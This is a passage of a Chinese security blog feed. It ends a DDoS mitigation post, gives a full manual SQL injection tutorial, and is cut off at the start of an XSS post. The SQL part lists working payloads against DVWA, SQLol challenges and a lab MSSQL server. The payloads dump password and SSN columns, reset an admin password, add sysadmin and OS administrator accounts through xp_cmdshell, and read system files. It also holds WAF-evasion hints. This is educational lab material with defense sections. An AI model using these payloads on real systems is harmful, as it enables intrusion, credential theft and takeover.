title="攻击方式"></a>攻击方式</h3><ul><li><p><strong>混合型</strong></p><p>在实际大流量的攻击中，通常并不是以上述一种数据类型来攻击，往往是混杂了TCP和UDP流量，网络层和应用层攻击同时进行。</p></li><li><p><strong>反射型</strong></p><p>2004年时DRDOS第一次披露，通过将SYN包的源地址设置为目标地址，然后向大量的</p></li></ul></li></ul><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码是互联网中常见的技术之一，英文简称是CAPTCHA（Completely Autornated Public Turing Test to Tell Computers and Humans Apart，全自动区分计算机和人类的图灵测试）。</p><p>CAPTCHA发明的初衷，是为了识别人与机器。</p><p>因为验证码的验证过程，是比对用户提交的明文和服务器端Session里保存的验证码明文是否一致。</p><h3 id="资源耗尽攻击"><a href="#资源耗尽攻击" class="headerlink" title="资源耗尽攻击"></a>资源耗尽攻击</h3><p><strong>Slowloris攻击</strong></p><p>Slowloris￼是在2009年由著名的Web安全专家RSnake提出的一种攻击方法，其原理是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务。</p><h3 id="HTTP-POST-DOS"><a href="#HTTP-POST-DOS" class="headerlink" title="HTTP POST DOS"></a>HTTP POST DOS</h3><p>在2010年的OWASP大会上，Wong Onn Chee和Tom Brennan演示了一种类似于Slowloris效果的攻击方法，作者称之为HTTP POST D.O.S</p><h2 id="0x04-防御应用层DDOS"><a href="#0x04-防御应用层DDOS" class="headerlink" title="0x04 防御应用层DDOS"></a>0x04 防御应用层DDOS</h2><p>DDOS攻击本质上是一种只能缓解而不能完全防御的攻击，它不像漏洞那样打个补丁解决了就是解决了，DDOS就算购买和部署了当前市场上比较有竞争力的防御解决方案也完全谈不上彻底根治。防火墙、IPS、WAF这些安全产品都号称自己有一定的抗DDOS能力，而实际上他们只针对小流量下，应用层的攻击比较有效，对于稍大流量的DDOS攻击则无济于事。</p><p>让客户端解析一段JavaScript，并给出正确的运行结果。因为大部分的自动化脚本都是直接构造HTTP包完成的，并非在一个浏览器环境中发起的请求。</p><p>在Apache的配置文件中，有一些参数可以缓解DDOS攻击，比如调小Timeout、KeepAliveout值，增加MaxClients值。</p><p>用开源的Module来实现针对应用层DDOS攻击的保护。mod_qos是Apahe的一个Module，它可以帮助缓解应用层DDOS攻击。</p><h3 id="主机设置"><a href="#主机设置" class="headerlink" title="主机设置"></a>主机设置</h3><p>所有的主机平台都有抵御DoS的设置，总结一下，基本的有几种：</p><p><strong>关闭不必要的</strong><a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1" target="_blank" rel="noopener">服务</a></p><p><strong>限制同时打开的Syn半连接数目</strong></p><p><strong>缩短Syn半连接的time out 时间</strong></p><p><strong>及时更新系统补丁</strong></p><h3 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h3><p>网络设备可以从防火墙与路由器上考虑。这两个设备是到外界的接口设备，在进行防DDoS设置的同时，要注意一下这是以多大的效率牺牲为代价的，对你来说是否值得。</p><p><strong>1.防火墙</strong></p><p>禁止对主机的非开放服务的访问 限制同时打开的SYN最大连接数 限制特定IP地址的访问 启用防火墙的防DDoS的属性 严格限制对外开放的服务器的向外访问 第五项主要是防止自己的服务器被当做工具去害人。</p><p><strong>2.路由器</strong></p><p>设置SYN数据包流量速率 升级版本过低的ISO 为路由器建立log server。</p><p><img src="/images/SQL/89.png" alt="upload successful"></p><h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><p><a href="https://wooyun.kieran.top/#!/drops/774.%E6%B5%85%E6%9E%90%E5%A4%A7%E8%A7%84%E6%A8%A1DDOS%E9%98%B2%E5%BE%A1%E6%9E%B6%E6%9E%84-%E5%BA%94%E5%AF%B9T%E7%BA%A7%E6%94%BB%E9%98%B2" target="_blank" rel="noopener">https://wooyun.kieran.top/#!/drops/774.%E6%B5%85%E6%9E%90%E5%A4%A7%E8%A7%84%E6%A8%A1DDOS%E9%98%B2%E5%BE%A1%E6%9E%B6%E6%9E%84-%E5%BA%94%E5%AF%B9T%E7%BA%A7%E6%94%BB%E9%98%B2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-DDOS简介&quot;&gt;&lt;a href=&quot;#0x01-DDOS简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 DDOS简介&quot;&gt;&lt;/a&gt;0x01 DDOS简介&lt;/h2&gt;&lt;p&gt;DDOS又称为分布式拒绝服务，全称是Distrbuted Denial of Service。DDOS本是利用合理的请求造成资源过载，导致服务不可用。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="DDOS" scheme="http://yoursite.com/tags/DDOS/"/>
    
  </entry>
  
  <entry>
    <title>分享一波手工SQL注入</title>
    <link href="http://yoursite.com/2018/09/02/%E5%88%86%E4%BA%AB%E4%B8%80%E6%B3%A2SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2018/09/02/分享一波SQL注入/</id>
    <published>2018-09-02T05:06:10.000Z</published>
    <updated>2018-09-02T06:37:20.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQL注入简介"><a href="#0x01-SQL注入简介" class="headerlink" title="0x01 SQL注入简介"></a>0x01 SQL注入简介</h2><p>SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。</p><a id="more"></a><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击</p><p>SQL注入漏洞可读取/修改数据库中的库和表，获取用户的账号，密码，邮箱，联系方式，信用卡信息，修改产品价格，删除数据。修改权限，获取系统管理员权限，修改任意门文件，安装后门。</p><h2 id="0x02-SQL注入原理"><a href="#0x02-SQL注入原理" class="headerlink" title="0x02 SQL注入原理"></a>0x02 SQL注入原理</h2><p><img src="/images/SQL/51.png" alt="upload successful"></p><h3 id="SQL注入产生的原因"><a href="#SQL注入产生的原因" class="headerlink" title="SQL注入产生的原因"></a>SQL注入产生的原因</h3><p>程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行</p><p>盲注：就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到执行。</p><h3 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h3><p>利用BENCHMARK（）函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断出注入语句是否执行成功。</p><p>Timing Attack是盲注的一种高级技巧</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>利用“用户自定义函数”的技巧，即UDF（User-Defined Functions）来执行命令。</p><h2 id="0x03-编码注入方式"><a href="#0x03-编码注入方式" class="headerlink" title="0x03 编码注入方式"></a>0x03 编码注入方式</h2><p><strong>宽字节注入，这个是怎么回事呢？</strong></p><p>在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。</p><p>简单来说%df’会被过滤函数转义为%df\’ ，%df\’ = %df%5c%27  在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。</p><p>那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。</p><p>二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。</p><p>我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。</p><p>那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%，</p><p>这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’.</p><p>我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。</p><h3 id="从漏洞类型区分可以分为三种类型："><a href="#从漏洞类型区分可以分为三种类型：" class="headerlink" title="从漏洞类型区分可以分为三种类型："></a>从漏洞类型区分可以分为三种类型：</h3><p><strong>1.可显</strong></p><p>攻击者可以直接在当前界面内容中获取想要获得的内容。</p><p><strong>2.报错</strong></p><p>数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。</p><p>所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。</p><p><strong>3.盲注</strong></p><p>数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。</p><h2 id="0x04-SQL-注入漏洞挖掘方法"><a href="#0x04-SQL-注入漏洞挖掘方法" class="headerlink" title="0x04 SQL 注入漏洞挖掘方法"></a>0x04 SQL 注入漏洞挖掘方法</h2><p><strong>针对上面提到的利用漏洞方法，总结了以下的挖掘方法：</strong></p><ol><li>参数接收位置，检查是否有没过滤直接使用  _POST、$_COOKIE 参数的。</li><li>SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。</li><li>宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’)就行。</li><li>二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 rawurldecode 找到二次url漏洞。</li></ol><h2 id="0x05-正确的防御SQL注入"><a href="#0x05-正确的防御SQL注入" class="headerlink" title="0x05 正确的防御SQL注入"></a>0x05 正确的防御SQL注入</h2><p><strong>1、使用预编译语句，绑定变量。</strong></p><p><strong>2、使用存储过程：使用安全的存储过程对抗SQL注入。</strong></p><p><strong>3、检查数据类型</strong></p><p><strong>4、使用安全函数</strong></p><h2 id="0x06-SQL注入实战"><a href="#0x06-SQL注入实战" class="headerlink" title="0x06 SQL注入实战"></a>0x06 SQL注入实战</h2><h3 id="SQL注入一般流程"><a href="#SQL注入一般流程" class="headerlink" title="SQL注入一般流程"></a>SQL注入一般流程</h3><p><img src="/images/SQL/52.png" alt="upload successful"></p><h3 id="DVWA之SQL注入篇"><a href="#DVWA之SQL注入篇" class="headerlink" title="DVWA之SQL注入篇"></a>DVWA之SQL注入篇</h3><p><strong>1、首先猜查询信息的列数</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1‘ order by 2 #</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/53.png" alt="upload successful"></p><p><strong>2、获取数据库版本信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, (@@version); #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/54.png" alt="upload successful"></p><p><strong>3、获取当前的数据库名称</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, (database()); #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/55.png" alt="upload successful"></p><p><strong>4、获取数据库所有的库名称</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(schema_name) from information_schema.schemata #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/56.png" alt="upload successful"></p><p><strong>5、获取数据库下表的名称</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/57.png" alt="upload successful"></p><p><strong>6、获得表的字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/58.png" alt="upload successful"></p><p><strong>7、下载数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/59.png" alt="upload successful"></p><h3 id="MCIR-SQLol-Challenges-SQL注入"><a href="#MCIR-SQLol-Challenges-SQL注入" class="headerlink" title="MCIR SQLol Challenges SQL注入"></a>MCIR SQLol Challenges SQL注入</h3><h4 id="Challenge-0-Hello-world"><a href="#Challenge-0-Hello-world" class="headerlink" title="Challenge 0 - Hello, world!"></a><a href="http://mcir.pte.com/sqlol/challenges/challenge0.php" target="_blank" rel="noopener">Challenge 0</a> - Hello, world!</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or 1=1 #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/60.png" alt="upload successful"></p><h4 id="Challenge-1-SQL-Injection-101"><a href="#Challenge-1-SQL-Injection-101" class="headerlink" title="Challenge 1 - SQL Injection 101"></a><a href="http://mcir.pte.com/sqlol/challenges/challenge1.php" target="_blank" rel="noopener">Challenge 1</a> - SQL Injection 101</h4><p><strong>题意是找到social security present表并提取出该表的所有信息。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 1#   //猜列数</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/61.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select database() #     //查询当前数据库</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/62.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select concat_ws(char(32,58,32),user(),database(),version()) #       //  _ws(char(32,58,32) 表示空格冒号空格</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/63.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure></p><p><img src="/images/SQL/64.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select concat_ws(char(32,58,32),name,ssn) from ssn #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/65.png" alt="upload successful"></p><h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h4><p><strong>题意是过滤掉了单引号然后要实现Challenge1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select concat_ws(char(32,58,32),name,ssn) from ssn #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/66.png" alt="upload successful"></p><h4 id="Challenge-3-Death-Row"><a href="#Challenge-3-Death-Row" class="headerlink" title="Challenge 3 - Death Row"></a>Challenge 3 - Death Row</h4><p><strong>与Challenge1类似但要求是一次只返回一行的结果</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select concat(name,&apos; &apos; ,ssn) from ssn limit 1 #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/67.png" alt="upload successful"></p><p>接下来的以此类推。</p><h5 id="Challenge-4-War-on-Error"><a href="#Challenge-4-War-on-Error" class="headerlink" title="Challenge 4 - War on Error"></a>Challenge 4 - War on Error</h5><p><strong>题意是results出没有显示内容，但查询结果在errors处显示出来。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(&apos;junk&apos;,concat(0x01,(SELECT concat(name,&apos; &apos;,ssn) FROM ssn limit 0,1),0x20),1) #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/68.png" alt="upload successful"></p><h4 id="Challenge-5-Blind-Luck"><a href="#Challenge-5-Blind-Luck" class="headerlink" title="Challenge 5 - Blind Luck"></a>Challenge 5 - Blind Luck</h4><p><strong>sql盲注，没有错误提示</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or ascii(substring((select user()),1,1)) = 112 #     ---112是P</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/69.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or ascii(substring((select user()),2,1)) = 116 #    116---代表的是t</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/70.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt;= 115 #</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/71.png" alt="upload successful"></p><p>接着试&gt;=116  发现没有出现Got resultst说明第一个表名的第一个字母为s。</p><h3 id="自搭MSSQL注入环境"><a href="#自搭MSSQL注入环境" class="headerlink" title="自搭MSSQL注入环境"></a>自搭MSSQL注入环境</h3><h4 id="启动vm2003"><a href="#启动vm2003" class="headerlink" title="启动vm2003"></a>启动vm2003</h4><p>1.开始–程序–mssqlserver-服务管理器–服务启动</p><p>2.iis服务管理器-网站–wenzhang:主机头，启动</p><p><img src="/images/SQL/72.png" alt="upload successful"></p><p><img src="/images/SQL/73.png" alt="upload successful"></p><p>浏览器输入192.168.2.5访问wenzhang网站，在点击导读，然后里面存在注入点。</p><p><img src="/images/SQL/74.png" alt="upload successful"></p><p><a href="http://192.168.2.5/list.asp?id=1" target="_blank" rel="noopener">http://192.168.2.5/list.asp?id=1</a></p><p><strong>1.判断数据库类型</strong>：<br>‘<br>and (select count(*) from 独有表)&gt;0<br>oracle:dual<br>mssql:sysobjects<br>mysql:shema<br>access:mssysobjects</p><p><strong>2.判断版本号：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p><p>Microsoft SQL Server 2000    Windows NT 5.2</p><p>NT 5.0:windows 2000</p><p>NT 5.2:Windows 2003 </p><p>NT 6.1:windows7 sp</p><p><img src="/images/SQL/75.png" alt="upload successful"></p><p><strong>3.当前连接数据库的用户：dbo=sa</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and user&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/76.png" alt="upload successful"></p><p><strong>4.判断当前连接的数据库：article</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/77.png" alt="upload successful"></p><p><strong>5.判断其它数据库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select name from master..sysdatabases where dbid=6)&gt;0</span><br></pre></td></tr></table></figure><p>dbid的值可以从1-6选择，会爆出相应的项。</p><p><img src="/images/SQL/78.png" alt="upload successful"></p><p><strong>6.判断表：’t_jiaozhu’</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/79.png" alt="upload successful"></p><p><strong>7.判断其它表：admin</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0 and name not in(&apos;t_jiaozhu&apos;,&apos;Aclass&apos;))&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/80.png" alt="upload successful"></p><p><strong>8.判断列名：admin(usernae,password)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/81.png" alt="upload successful"></p><p><strong>9.判断值</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select username from admin)&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/82.png" alt="upload successful"></p><p><strong>10.修改密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--    #将admin的密码改成cccccc</span><br><span class="line">and (select password from admin)&gt;0   #检测是否更改成功</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/83.png" alt="upload successful"></p><p><strong>11.添加数据库的用户；</strong></p><p>（1）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addlogin hyd,888888;--</span><br></pre></td></tr></table></figure></p><p>（2）查看vm2003中：开始–程序–mssqlserver–企业管理器–安全性–登录</p><p><img src="/images/SQL/84.png" alt="upload successful"></p><p>（3）提权：把hyd加入sysadmin组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addsrvrolemember hyd,sysadmin;--</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/85.png" alt="upload successful"></p><p>4.利用：数据库连接工具：查询分析器,navicat:</p><h4 id="操作系统提权"><a href="#操作系统提权" class="headerlink" title="操作系统提权"></a>操作系统提权</h4><p>1.新建用户:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net user cisp 888888 /add &apos;--</span><br></pre></td></tr></table></figure><p>2.提权：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure><p>3.利用：3389;ipc空连接  用远程桌面连接，它的远程桌面端口开的是1234</p><h4 id="读系统文件c-boot-ini"><a href="#读系统文件c-boot-ini" class="headerlink" title="读系统文件c:\boot.ini"></a>读系统文件c:\boot.ini</h4><p>1.数据连接工具：navicat:</p><p>2.查询–新建查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure><h4 id="向系统写文件"><a href="#向系统写文件" class="headerlink" title="向系统写文件"></a>向系统写文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br></pre></td></tr></table></figure><p><img src="/images/SQL/86.png" alt="upload successful"></p><h4 id="xp-cmdshell防御"><a href="#xp-cmdshell防御" class="headerlink" title="xp_cmdshell防御"></a>xp_cmdshell防御</h4><p>1.删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure><p>2.恢复：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure><p>3.防xp_cmdshell.防未公布：cmd反弹</p><p>c:\windows\system32\cmd.exe</p><p>删除所有默认权限，添加administrator–完全控制</p><h4 id="防注入："><a href="#防注入：" class="headerlink" title="防注入："></a>防注入：</h4><p><strong>1.脚本调用：编写防注入脚本</strong></p><p>过滤关键字：and or union ; ‘ sp_ xp_ update</p><p>exec select delete drop</p><p>防post get cookie</p><p>判断哪个脚本有漏洞</p><p>调用：include file=noinject.asp</p><p>最前面：搜索型</p><p><strong>2.安全编码：</strong>int–&gt;cint,参数化查询</p><p>3.waf:web app fw: 软件，硬件</p><p>sqlmap:tamper:base</p><p>通配符：cat ??t /etc/passwd</p><p>as /**/</p><p>hash:</p><p>sqlmap.py -u url -v 3</p><h2 id="0X07-参考文献"><a href="#0X07-参考文献" class="headerlink" title="0X07 参考文献"></a>0X07 参考文献</h2><p><a href="https://blog.csdn.net/xianjie0318/article/details/80900632" target="_blank" rel="noopener">https://blog.csdn.net/xianjie0318/article/details/80900632</a></p><p><a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/120747.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-SQL注入简介&quot;&gt;&lt;a href=&quot;#0x01-SQL注入简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 SQL注入简介&quot;&gt;&lt;/a&gt;0x01 SQL注入简介&lt;/h2&gt;&lt;p&gt;SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XSS姿势分享</title>
    <link href="http://yoursite.com/2018/08/30/XSS%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB/"/>
    <id>http://yoursite.com/2018/08/30/XSS姿势分享/</id>
    <published>2018-08-30T13:30:46.000Z</published>
    <updated>2018-08-30T13:48:51.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-什么是XSS（Cross-Site-Scripting）"><a href="#0x01-什么是XSS（Cross-Site-Scripting）" class="headerlink" title="0x01 什么是XSS（Cross-Site Scripting）"></a>0x01 什么是XSS（Cross-Site Scripting）</h2><p>XSS即跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表（Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。<br><a id="more"></a><br>XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。在 WEB2.0 时代，强调的是互动，使得用户输入信息的机会大增，在这个情况下，我们作为开发者，在开发的时候，要提高警惕。</p><p><img src="/images/pasted-104.png" alt="upload successful"></p><h2 id="0x02-XSS漏洞分类"><a href="#0x02-XSS漏洞分类" class="headerlink" title="0x02 XSS漏洞分类"></a>0x02 XSS漏洞分类</h2><h3 id="1-反射型，危害小，一般"><a href="#1-反射型，危害小，一般" class="headerlink" 